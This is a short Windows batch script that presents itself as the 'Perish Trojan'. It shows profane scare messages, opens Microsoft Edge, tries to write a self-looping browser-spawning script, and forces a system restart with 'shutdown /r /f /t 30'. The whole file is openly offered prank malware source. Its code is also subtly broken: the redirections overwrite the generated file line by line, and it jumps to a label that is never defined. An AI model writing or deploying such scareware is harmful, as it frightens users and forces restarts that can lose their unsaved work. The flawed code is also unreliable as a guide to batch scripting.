@echo off
color 04
echo YOUR COMPUTER HAS BEEN FUCKED BY THE PERISH TROJAN
pause

echo Do you wanna face it? (yes/no)
set /p input=Type yes to continue: 

if /i "%input%"=="yes" goto yes
if /i "%input%"=="no" goto no

echo Invalid response. Exiting...
pause
exit

:yes
start msedge
exit

:no
echo Are you for real rn?
pause
echo You're still getting your PC fucked.
pause
start
echo ONE LAST CHANCE, would you like to fuck your pc?
pause
set /p input=Type yes to continue: 
if /i "%input%"=="yes" goto yes2
if /i "%input%"=="no" goto no2

:yes2
echo YOUR COMPUTER IS FUCKED NOW EZ
pause
echo ^@echo off > perish.bat
echo echo YOUR COMPUTER HAS BEEN FUCKED BY THIS MALWARE! GOOD LUCK GETTIN YOUR PC BACK. > perish.bat
echo :loop > perish.bat
echo start msedge > perish.bat
echo start msedge > perish.bat
echo start msedge> perish.bat
echo start msedge > perish.bat
echo start msedge > perish.bat
echo start msedge > perish.bat
echo start msedge > perish.bat

   
echo pause > perish.bat
pause > perish.bat
shutdown /r /f /t 30 > perish.bat
echo pause >> perish.bat

exit

